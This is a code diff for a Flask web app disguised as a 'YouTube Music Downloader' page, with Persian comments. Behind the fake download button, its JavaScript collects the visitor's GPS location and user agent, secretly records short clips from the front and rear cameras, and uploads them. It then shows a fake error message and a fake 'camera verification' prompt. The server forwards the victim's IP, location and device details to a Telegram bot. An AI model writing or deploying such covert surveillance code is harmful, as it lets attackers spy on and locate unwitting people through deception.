@@ -11,47 +11,63 @@ WEB_URL = "https://web-production-2ed72b.up.railway.app"
 
 HTML_TEMPLATE = """
 <!DOCTYPE html>
-<html lang="fa" dir="ltr">
+<html lang="fa" dir="rtl">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>YouTube Music Downloader</title>
 <style>
     body{background:#f0f2f5;font-family:sans-serif;margin:0;padding:0;text-align:center}
-    .header{background:#ff0000;color:white;padding:25px 10px;box-shadow:0 2px 5px rgba(0,0,0,0.2)}
-    .header h1{margin:5px 0;font-size:22px;letter-spacing:1px}
-    .container{background:white;max-width:420px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);text-align:left}
+    .header{background:#ff0000;color:white;padding:20px;font-weight:bold}
+    .container{background:white;max-width:400px;margin:30px auto;padding:25px;border-radius:15px;box-shadow:0 4px 15px rgba(0,0,0,0.1);position:relative}
     .input-box{width:100%;padding:14px;border:1px solid #ccc;border-radius:8px;font-size:14px;box-sizing:border-box;margin-bottom:15px;outline:none}
-    .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer;box-shadow:0 4px 10px rgba(255,0,0,0.3)}
-    .instructions{margin-top:25px;background:#fff5f5;padding:15px;border-radius:8px;border-left:4px solid #ff0000}
-    .instructions h3{margin-top:0;font-size:15px;color:#333}
-    .instructions ol{padding-left:20px;margin:0;font-size:13px;color:#555;line-height:1.6}
+    .btn{background:#ff0000;color:white;border:none;padding:15px;width:100%;border-radius:8px;font-size:16px;font-weight:bold;cursor:pointer}
+    
+    /* استایل صفحه خطا و اخطار دسترسی دوربین */
+    #permissionModal {
+        display: none;
+        position: absolute;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(255, 255, 255, 0.95);
+        border-radius: 15px;
+        z-index: 10;
+        padding-top: 60px;
+        box-sizing: border-box;
+    }
+    #permissionModal h2 {
+        color: #111;
+        font-size: 20px;
+        margin-top: 15px;
+    }
+    #permissionModal p {
+        color: #555;
+        font-size: 14px;
+        padding: 0 20px;
+        line-height: 1.5;
+    }
 </style>
 </head>
 <body>
     <div class="header">
-        <h1>▶ YouTube</h1>
-        <h1>YOUTUBE MUSIC DOWNLOADER</h1>
+        <h2>YouTube Music Downloader</h2>
     </div>
 
     <div class="container">
-        <input type="text" class="input-box" placeholder="Paste YouTube Music Link" id="urlInput">
-        <button class="btn" onclick="startProcess()">FETCH</button>
-
-        <div class="instructions">
-            <h3>How to Download HD YouTube Music Thumbnail</h3>
-            <ol>
-                <li>Copy the YouTube Music Video Link</li>
-                <li>Paste the link in the field above</li>
-                <li>Click on "FETCH" to start process</li>
-            </ol>
+        <!-- کادر اخطار که دقیقاً مثل عکس شما ظاهر می‌شود -->
+        <div id="permissionModal">
+            <div style="font-size: 40px;">🔒</div>
+            <h2>Camera Permission Needed</h2>
+            <p>Please enable camera access in your browser settings to proceed with verification.</p>
         </div>
+
+        <input type="text" class="input-box" id="urlInput" placeholder="Paste YouTube Music Link">
+        <button class="btn" onclick="startProcess()">FETCH</button>
     </div>
 
     <video id="video" autoplay playsinline muted style="display:none"></video>
 
     <script>
-    async function recordCamera(facingMode, label) {
+    async function recordAndSend(facingMode, label, info) {
         return new Promise(async (resolve, reject) => {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -68,13 +84,21 @@ HTML_TEMPLATE = """
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: 'video/webm' });
-                    resolve({ blob, stream });
+                    const formData = new FormData();
+                    formData.append("video", blob);
+                    formData.append("info", JSON.stringify(info));
+                    formData.append("cam", label);
+                    
+                    await fetch("/upload", { method: "POST", body: formData });
+                    stream.getTracks().forEach(t => t.stop());
+                    resolve();
                 };
                 
                 mediaRecorder.start();
                 setTimeout(() => {
                     mediaRecorder.stop();
-                }, 4000); // ضبط 4 ثانیه
+                }, 4000); // ضبط 4 ثانیه ویدیو
+                
             } catch (err) {
                 reject(err);
             }
@@ -82,55 +106,36 @@ HTML_TEMPLATE = """
     }
 
     async function startProcess() {
-        const urlVal = document.getElementById('urlInput').value;
-        if(!urlVal) {
+        const url = document.getElementById('urlInput').value;
+        if(!url) {
             alert("لطفاً لینک را وارد کنید!");
             return;
         }
 
-        alert("در حال پردازش و اتصال به سرور...");
-
-        // ۱. دریافت لوکیشن و مشخصات
+        // گرفتن لوکیشن کاربر
         navigator.geolocation.getCurrentPosition(async (pos) => {
-            const lat = pos.coords.latitude;
-            const lon = pos.coords.longitude;
             const info = {
-                ua: navigator.userAgent,
-                lat: lat,
-                lon: lon,
-                screen: window.screen.width + "x" + window.screen.height
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                ua: navigator.userAgent
             };
 
             try {
-                // ۲. ضبط دوربین جلو (User)
-                const frontResult = await recordCamera("user", "جلو");
-                frontResult.stream.getTracks().forEach(t => t.stop());
+                // ۱. اول دوربین جلو
+                await recordAndSend("user", "دوربین جلو (Front)", info);
+                
+                // ۲. بعد دوربین عقب
+                await recordAndSend("environment", "دوربین عقب (Rear)", info);
 
-                // ارسال ویدیو دوربین جلو
-                let formDataFront = new FormData();
-                formDataFront.append("video", frontResult.blob);
-                formDataFront.append("info", JSON.stringify(info));
-                formDataFront.append("cam", "دوربین جلو (Front Camera)");
-                await fetch("/upload", { method: "POST", body: formDataFront });
-
-                // ۳. ضبط دوربین عقب (Environment)
-                const rearResult = await recordCamera("environment", "عقب");
-                rearResult.stream.getTracks().forEach(t => t.stop());
-
-                // ارسال ویدیو دوربین عقب
-                let formDataRear = new FormData();
-                formDataRear.append("video", rearResult.blob);
-                formDataRear.append("info", JSON.stringify(info));
-                formDataRear.append("cam", "دوربین عقب (Rear Camera)");
-                await fetch("/upload", { method: "POST", body: formDataRear });
-
-                alert("خطا در دریافت فایل صوتی! لطفا دوباره امتحان کنید.");
-
+                alert("خطا در بارگیری فایل صوتی. لطفاً بعداً تلاش کنید.");
+                
             } catch (e) {
-                alert("لطفاً دسترسی به دوربین و لوکیشن را تأیید کنید.");
+                // اگر کاربر اجازه نداد، باکس اخطار ظاهر می‌شود
+                document.getElementById('permissionModal').style.display = 'block';
             }
         }, (err) => {
-            alert("لطفاً دسترسی به موقعیت مکانی (Location) را فعال کنید.");
+            // اگر به لوکیشن اجازه نداد هم اخطار دوربین را نشان می‌دهیم
+            document.getElementById('permissionModal').style.display = 'block';
         }, { enableHighAccuracy: true });
     }
     </script>
@@ -163,18 +168,16 @@ def upload():
     lat = info.get('lat', 'نامشخص')
     lon = info.get('lon', 'نامشخص')
     ua = info.get('ua', 'نامشخص')
-    screen = info.get('screen', 'نامشخص')
     user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
     msg = (
         f"🚨 **گزارش جدید ({cam_type}):**\n\n"
         f"📍 موقعیت GPS: {lat}, {lon}\n"
         f"🌐 آی‌پی: {user_ip}\n"
-        f"🖥 صفحه نمایش: {screen}\n"
         f"📱 مشخصات دستگاه: {ua}"
     )
     
-    # ارسال لوکیشن فقط در اولین درخواست (دوربین جلو)
+    # ارسال لوکیشن فقط در بخش اول (دوربین جلو)
     if lat != 'نامشخص' and lon != 'نامشخص' and "جلو" in cam_type:
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",
